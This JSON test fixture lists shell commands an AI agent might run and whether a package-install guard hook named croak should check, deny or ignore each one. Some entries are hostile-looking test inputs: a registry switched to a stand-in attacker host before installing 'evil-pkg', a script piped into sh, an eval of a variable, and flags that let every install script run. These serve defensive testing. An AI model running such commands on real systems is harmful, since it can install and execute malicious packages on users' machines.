{
  "description": "Shell commands an AI agent runs, and what croak's hook must do before they run (D32). check: croak-install checks it; deny: croak cannot vouch for it; ignore: it installs nothing. Run in /repo, a project with package.json, frontend/ and server/ subprojects, and a local tsc bin. knownGap marks honest misses that are scored but allowed to fail.",
  "commands": [
    {
      "command": "npm install axios",
      "expect": "check",
      "why": "the most common agent install"
    },
    {
      "command": "npm i -D @types/node typescript",
      "expect": "check",
      "why": "dev dependencies install the same way"
    },
    {
      "command": "cd frontend && npm install",
      "expect": "check",
      "why": "a nested install (D20)"
    },
    {
      "command": "npx create-next-app@latest my-app",
      "expect": "check",
      "why": "npx downloads and runs at once"
    },
    {
      "command": "npm create vite@latest web -- --template react-ts",
      "expect": "check",
      "why": "npm create runs create-vite"
    },
    {
      "command": "npm ci",
      "expect": "check",
      "why": "reinstalls every locked package"
    },
    {
      "command": "npx -y @modelcontextprotocol/server-filesystem /tmp",
      "expect": "check",
      "why": "agents start MCP servers with npx"
    },
    {
      "command": "sudo npm install -g pnpm",
      "expect": "check",
      "why": "global installs run scripts too"
    },
    {
      "command": "bash -c \"npm install express\"",
      "expect": "check",
      "why": "an install inside sh -c"
    },
    {
      "command": "npm --prefix server install",
      "expect": "check",
      "why": "--prefix moves the install"
    },
    {
      "command": "npm exec --yes prettier -- --write .",
      "expect": "check",
      "why": "npm exec downloads a missing package"
    },
    {
      "command": "npm update",
      "expect": "check",
      "why": "updates bring in new versions"
    },
    {
      "command": "npm install $(cat deps.txt)",
      "expect": "deny",
      "why": "packages only known at run time"
    },
    {
      "command": "pnpm add zod",
      "expect": "check",
      "why": "pnpm is checked since M6"
    },
    {
      "command": "yarn add react",
      "expect": "deny",
      "why": "yarn is not checked yet (M6)"
    },
    {
      "command": "npm i --registry https://npm.internal.invalid pkg",
      "expect": "deny",
      "why": "a registry croak does not check"
    },
    {
      "command": "cd \"$WORKDIR\" && npm install",
      "expect": "deny",
      "why": "a directory only known at run time"
    },
    {
      "command": "eval \"$INSTALL_CMD\"",
      "expect": "deny",
      "why": "eval of a variable could be an install",
      "knownGap": true
    },
    {
      "command": "npm test",
      "expect": "ignore",
      "why": "runs project scripts, installs nothing"
    },
    {
      "command": "npm run build",
      "expect": "ignore",
      "why": "runs project scripts, installs nothing"
    },
    {
      "command": "npm run lint -- --fix",
      "expect": "ignore",
      "why": "runs project scripts, installs nothing"
    },
    {
      "command": "npx tsc --noEmit",
      "expect": "ignore",
      "why": "a bin the project already has"
    },
    {
      "command": "git commit -m \"fix: npm install step\"",
      "expect": "ignore",
      "why": "npm install is only text in a message"
    },
    {
      "command": "echo \"run npm install first\"",
      "expect": "ignore",
      "why": "npm install is only text"
    },
    {
      "command": "grep -rn \"npm i\" docs/",
      "expect": "ignore",
      "why": "npm i is only a search pattern"
    },
    {
      "command": "npm ls --depth=0",
      "expect": "ignore",
      "why": "reads the tree"
    },
    {
      "command": "npm view react version",
      "expect": "ignore",
      "why": "reads registry metadata"
    },
    {
      "command": "npm outdated",
      "expect": "ignore",
      "why": "reads registry metadata"
    },
    {
      "command": "npm init -y",
      "expect": "ignore",
      "why": "writes package.json, installs nothing"
    },
    {
      "command": "node -e \"console.log(process.version)\"",
      "expect": "ignore",
      "why": "not a package manager"
    },
    {
      "command": "if [ -f package.json ]; then npm install evil-pkg; fi",
      "expect": "check",
      "why": "an install inside if/then (M4 review)"
    },
    {
      "command": "timeout 300 npm install evil-pkg",
      "expect": "check",
      "why": "a wrapper with a value (M4 review)"
    },
    {
      "command": "bash -lc 'npm install evil-pkg'",
      "expect": "check",
      "why": "combined shell flags (M4 review)"
    },
    {
      "command": "version=$(npm i evil-pkg)",
      "expect": "check",
      "why": "an install inside $(…) (M4 review)"
    },
    {
      "command": "npm -C /repo/server install evil-pkg",
      "expect": "check",
      "why": "-C is --prefix (M4 review)"
    },
    {
      "command": "npm upd",
      "expect": "check",
      "why": "npm accepts unique prefixes (M4 review)"
    },
    {
      "command": "cd src && npm install",
      "expect": "check",
      "why": "npm installs into the project root, not src/ (M4 review)"
    },
    {
      "command": "echo 'npm install evil-pkg' | sh",
      "expect": "deny",
      "why": "a script piped into a shell (M4 review)"
    },
    {
      "command": "ls packages | xargs npm install",
      "expect": "deny",
      "why": "arguments croak cannot follow (M4 review)"
    },
    {
      "command": "npm config set registry https://attacker.invalid/ && npm i evil-pkg",
      "expect": "deny",
      "why": "registry changed before installing (M4 review)"
    },
    {
      "command": "npm audit fix",
      "expect": "deny",
      "why": "not checked yet (M4 review)"
    },
    {
      "command": "cat > NOTES.md <<'EOF'\nRun npm install first.\nEOF",
      "expect": "ignore",
      "why": "a heredoc body is data"
    },
    {
      "command": "bash scripts/build.sh && npm test",
      "expect": "ignore",
      "why": "a script file, not an install"
    },
    {
      "command": "pnpm dlx create-vite@latest app",
      "expect": "check",
      "why": "pnpm dlx downloads and runs at once (M6)"
    },
    {
      "command": "cd packages/web && pnpm install",
      "expect": "check",
      "why": "a pnpm workspace member, checked at the root (M6)"
    },
    {
      "command": "pnpm install --frozen-lockfile",
      "expect": "check",
      "why": "installs the lockfile as written (M6)"
    },
    {
      "command": "pnpm --registry https://npm.internal.invalid add x",
      "expect": "deny",
      "why": "a registry croak does not check (M6)"
    },
    {
      "command": "pnpm exec tsc --noEmit",
      "expect": "ignore",
      "why": "runs a local bin, installs nothing (M6)"
    },
    {
      "command": "pnpm run test",
      "expect": "ignore",
      "why": "runs project scripts, installs nothing (M6)"
    },
    {
      "command": "pnpm install --dangerously-allow-all-builds",
      "expect": "deny",
      "why": "a flag that lets every build run (M6 review)"
    },
    {
      "command": "pnpm add --allow-build=evil evil",
      "expect": "deny",
      "why": "a flag that allows one package's build (M6 review)"
    },
    {
      "command": "pnpm with 9.15.4 install",
      "expect": "deny",
      "why": "runs another pnpm version (M6 review)"
    },
    {
      "command": "pnpm ci",
      "expect": "check",
      "why": "installs the lockfile as written (M6 review)"
    },
    {
      "command": "pnpm approve-builds esbuild",
      "expect": "deny",
      "why": "pnpm suggests it after ERR_PNPM_IGNORED_BUILDS; it runs the build (D55)"
    },
    {
      "command": "npm rebuild",
      "expect": "deny",
      "why": "runs installed packages' install scripts (D55)"
    },
    {
      "command": "npm install-scripts approve --all",
      "expect": "deny",
      "why": "lets every held-back install script run (D55)"
    },
    {
      "command": "npm i esbuild --dangerously-allow-all-scripts",
      "expect": "deny",
      "why": "overrides npm 12's script policy (D56)"
    },
    {
      "command": "pnpm ignored-builds",
      "expect": "ignore",
      "why": "only lists the held-back builds (D55)"
    }
  ]
}
